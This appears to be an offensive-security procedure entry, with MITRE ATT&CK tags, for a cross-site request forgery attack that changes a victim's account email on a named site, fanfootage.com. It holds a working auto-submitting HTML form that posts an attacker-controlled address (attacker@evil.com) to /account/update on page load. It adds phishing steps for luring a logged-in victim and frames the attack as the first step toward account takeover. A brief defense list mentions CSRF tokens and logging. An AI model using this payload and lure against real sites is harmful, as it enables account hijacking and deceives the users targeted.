---
tags:
  - csrf
  - phishing
  - web
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands: []
platforms:
  - Web
techniques:
  - '[[Drive-by Compromise]]'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
id: 7a68da2a-90eb-4c1d-9b7c-c9de8a3f48bd
created_at: '2025-12-14T17:32:58.047Z'
updated_at: '2025-12-14T17:32:58.047Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Drive-by Compromise]]'
---
# Craft-CSRF-Attack-for-Email-Change

## Summary

This procedure crafts a malicious HTML page that auto-submits a forged request to change the victim's email address in the target web application, exploiting CSRF.

## Description

Targeting applications like FanFootage where account updates lack token validation, this involves creating an auto-submitting form that POSTs to the vulnerable endpoint when the victim visits the page while authenticated. The attack relies on social engineering to direct the victim to the page, leading to unauthorized email change and potential takeover.

## Requirements

1. Knowledge of the vulnerable endpoint and parameters (e.g., /account/update with email param)
2. Hosting capability for the malicious HTML page (e.g., attacker server)
3. Victim authenticated in the target application

## Defense

Defensive measures and detection strategies:

- Require CSRF tokens for all POST requests
- Use frame-busting headers to prevent embedding
- Log and alert on rapid account changes

## Objectives

1. Trick victim into submitting forged account update
2. Change email to attacker-controlled address
3. Enable subsequent takeover steps

## Instructions

### Step 1: Create Malicious HTML Page

**Context**: Build the page with a hidden form that targets the account update endpoint.

Write the HTML file with auto-submit JavaScript:

```html
<!DOCTYPE html>
<html>
<head><title>Loading...</title></head>
<body onload="document.getElementById('form').submit()">
    <form id="form" action="https://fanfootage.com/account/update" method="POST">
        <input type="hidden" name="email" value="attacker@evil.com">
    </form>
    <p>Updating your settings...</p>
</body>
</html>
```

### Step 2: Host and Distribute

**Context**: Serve the page and lure the victim.

Upload to a web server and send a phishing link (e.g., via email: "Check this video!") to the victim. Ensure the victim is logged in to the target site.

> Expected output: Victim's email changes upon page load.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Drive-by Compromise]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[csrf]]
- [[drive-by-compromise]]
